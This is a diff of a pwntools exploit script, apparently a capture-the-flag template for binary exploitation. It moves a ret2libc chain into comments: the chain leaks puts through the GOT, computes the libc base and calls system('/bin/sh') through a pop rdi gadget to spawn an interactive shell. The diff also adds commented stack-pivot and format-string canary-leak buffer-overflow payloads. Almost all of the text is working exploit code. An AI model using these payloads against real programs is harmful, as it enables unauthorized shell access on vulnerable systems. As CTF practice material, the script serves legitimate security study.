@@ -133,24 +133,37 @@ io = start()
 #after first payload and calculating libc_base from ret2plt
 # payload = cyclic(56) + pack(libc_base + one_gadget)
 
-#Example
-pop_rdi = 0x401196
-ret = 0x40101a
-io.sendline(b'a')
-payload = cyclic(40) + pack(pop_rdi) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(elf.sym.main)
-io.sendline(payload)
+#stack pivoting
+# leave => mov rsp,rbp; pop rbp
+# leak = int(io.recvline(keepends = False), 16)
+# payload0 = pack(0) + pack(pop_rdi) + pack(first_arg) + pack(pop_rsi) + pack(second_arg) + pack(elf.sym.win)
+#offset is 120 here
+# payload1 = cyclic(112) + pack(leak) + pack(leave)
 
-libc = elf.libc
-leak = io.recvlines(6)[-1]
-print("The leaked data is:" + str(leak))
-leak_int = unpack(leak, 'all')
-libc_base = leak_int - libc.sym.puts
-print(hex(libc_base))
-bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
-system = libc_base + libc.sym.system
+#frmt str buffer overflow
+# payload = f'%21$p.%23$p.%25$p'.encode()
+# payload = cyclic(136) + pack(canary) + pack(0) + pack(libc_base + rop_gadget)
 
-# return to system
-io.sendline(b'a')
-payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
-io.sendline(payload)
-io.interactive()
+
+
+# #Example
+# pop_rdi = 0x401196
+# ret = 0x40101a
+# io.sendline(b'a')
+# payload = cyclic(40) + pack(pop_rdi) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(elf.sym.main)
+# io.sendline(payload)
+
+# libc = elf.libc
+# leak = io.recvlines(6)[-1]
+# print("The leaked data is:" + str(leak))
+# leak_int = unpack(leak, 'all')
+# libc_base = leak_int - libc.sym.puts
+# print(hex(libc_base))
+# bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
+# system = libc_base + libc.sym.system
+
+# # return to system
+# io.sendline(b'a')
+# payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
+# io.sendline(payload)
+# io.interactive()
